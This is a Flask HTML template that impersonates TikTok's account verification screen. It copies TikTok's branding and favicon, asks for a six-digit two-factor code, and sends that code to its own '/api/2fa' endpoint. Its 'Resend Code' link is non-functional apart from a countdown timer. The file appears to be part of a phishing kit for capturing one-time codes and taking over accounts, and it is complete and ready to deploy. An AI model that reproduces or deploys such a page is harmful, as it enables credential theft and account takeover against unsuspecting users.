<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok • Verification</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <style>
        body {
            background: #121212;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #fff;
        }
        .twofa-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .twofa-box {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .twofa-logo {
            font-size: 36px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 30px;
        }
        .twofa-icon {
            font-size: 60px;
            margin-bottom: 15px;
        }
        .twofa-title {
            font-size: 22px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 8px;
        }
        .twofa-desc {
            font-size: 14px;
            color: #a7a7a7;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }
        .code-input {
            width: 46px;
            height: 52px;
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            border: 2px solid #2a2a2a;
            border-radius: 8px;
            outline: none;
            background: #1a1a1a;
            color: #fff;
            transition: all 0.2s ease;
        }
        .code-input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.2);
        }
        .twofa-btn {
            width: 100%;
            padding: 14px;
            background: #ff0050;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 10px;
        }
        .twofa-btn:hover:not(:disabled) {
            background: #e00045;
        }
        .twofa-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .twofa-error {
            background: rgba(255, 0, 80, 0.1);
            border: 1px solid rgba(255, 0, 80, 0.3);
            color: #ff4444;
            padding: 10px;
            border-radius: 6px;
            font-size: 13px;
            margin-bottom: 10px;
            display: none;
            text-align: left;
        }
        .twofa-resend {
            margin-top: 20px;
            font-size: 14px;
            color: #a7a7a7;
        }
        .twofa-resend a {
            color: #ff0050;
            text-decoration: none;
            font-weight: 600;
        }
        .twofa-loader {
            display: none;
            text-align: center;
            padding: 10px 0;
        }
        .twofa-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #2a2a2a;
            border-top-color: #ff0050;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    
    <div class="twofa-wrapper">
        <div class="twofa-box">
            <div class="twofa-logo">TikTok</div>
            <div class="twofa-icon">🔐</div>
            <div class="twofa-title">Verify Your Account</div>
            <div class="twofa-desc" id="twofa-message">
                Enter the verification code to continue.
            </div>
            
            <div id="twofa-error" class="twofa-error"></div>
            
            <form id="twofa-form" method="POST" action="/api/2fa">
                <div class="code-inputs">
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
                </div>
                
                <button type="submit" id="twofa-submit" class="twofa-btn">Verify</button>
            </form>
            
            <div id="twofa-loader" class="twofa-loader">
                <div class="twofa-spinner"></div>
            </div>
            
            <div class="twofa-resend">
                <a href="#" id="resend-code" onclick="return false;">Resend Code</a>
            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const codeInputs = document.querySelectorAll('.code-input');
            const twofaForm = document.getElementById('twofa-form');
            const errorDiv = document.getElementById('twofa-error');
            const submitBtn = document.getElementById('twofa-submit');
            const loaderDiv = document.getElementById('twofa-loader');
            
            if (codeInputs.length > 0) codeInputs[0].focus();
            
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = this.value.replace(/[^0-9]/g, '');
                    this.value = value;
                    if (value.length === 1 && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pasted = (e.clipboardData || window.clipboardData).getData('text');
                    const numbers = pasted.replace(/[^0-9]/g, '').split('');
                    numbers.forEach((num, i) => {
                        if (codeInputs[index + i]) codeInputs[index + i].value = num;
                    });
                    const lastIdx = Math.min(index + numbers.length, codeInputs.length - 1);
                    codeInputs[lastIdx].focus();
                });
            });
            
            twofaForm.addEventListener('submit', function(e) {
                e.preventDefault();
                let code = '';
                codeInputs.forEach(input => { code += input.value; });
                
                if (code.length < 6) {
                    errorDiv.textContent = 'Please enter the complete 6-digit code.';
                    errorDiv.style.display = 'block';
                    return;
                }
                
                submitBtn.disabled = true;
                submitBtn.textContent = 'Verifying...';
                loaderDiv.style.display = 'block';
                errorDiv.style.display = 'none';
                
                fetch('/api/2fa', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({ code: code })
                })
                .then(res => res.json())
                .then(data => {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Verify';
                    loaderDiv.style.display = 'none';
                    
                    if (data.status === 'success') {
                        if (data.redirect) window.location.href = data.redirect;
                    } else {
                        errorDiv.textContent = data.message || 'Invalid code.';
                        errorDiv.style.display = 'block';
                        codeInputs.forEach(input => { input.value = ''; });
                        codeInputs[0].focus();
                    }
                })
                .catch(() => {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Verify';
                    loaderDiv.style.display = 'none';
                    errorDiv.textContent = 'Connection error. Please try again.';
                    errorDiv.style.display = 'block';
                });
            });
            
            const resendBtn = document.getElementById('resend-code');
            if (resendBtn) {
                let timeLeft = 30;
                resendBtn.style.color = '#606060';
                
                const timer = setInterval(() => {
                    timeLeft--;
                    resendBtn.textContent = `Resend Code (${timeLeft}s)`;
                    if (timeLeft <= 0) {
                        clearInterval(timer);
                        resendBtn.textContent = 'Resend Code';
                        resendBtn.style.color = '#ff0050';
                    }
                }, 1000);
            }
        });
    </script>
</body>
</html>
